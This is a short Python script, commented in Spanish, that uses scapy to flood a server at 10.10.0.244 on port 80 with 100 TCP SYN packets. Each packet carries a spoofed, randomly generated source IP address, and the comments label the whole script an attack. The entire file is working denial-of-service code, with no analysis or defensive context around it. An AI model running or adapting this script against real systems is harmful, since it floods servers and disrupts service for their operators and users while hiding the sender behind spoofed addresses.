from scapy.all import *

# Función para enviar paquetes SYN
def send_syn_packet(target_ip, target_port):
    # Crear un paquete IP con dirección de origen aleatoria
    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    ip_pkt = IP(src=src_ip, dst=target_ip)

    # Crear un paquete TCP con el flag 'SYN' (indicando una solicitud de conexión)
    syn_pkt = TCP(dport=target_port, flags="S")

    # Enviar el paquete
    send(ip_pkt/syn_pkt, verbose=0)

# Parámetros del ataque
target_ip = "10.10.0.244"  # IP del servidor de destino
target_port = 80          # Puerto de destino (ejemplo: 80 para HTTP)

# Número de paquetes SYN a enviar
num_packets = 100

# Ejecutar el ataque
print(f"Enviando {num_packets} paquetes SYN a {target_ip}:{target_port}...")
for _ in range(num_packets):
    send_syn_packet(target_ip, target_port)

print("Ataque completado.")
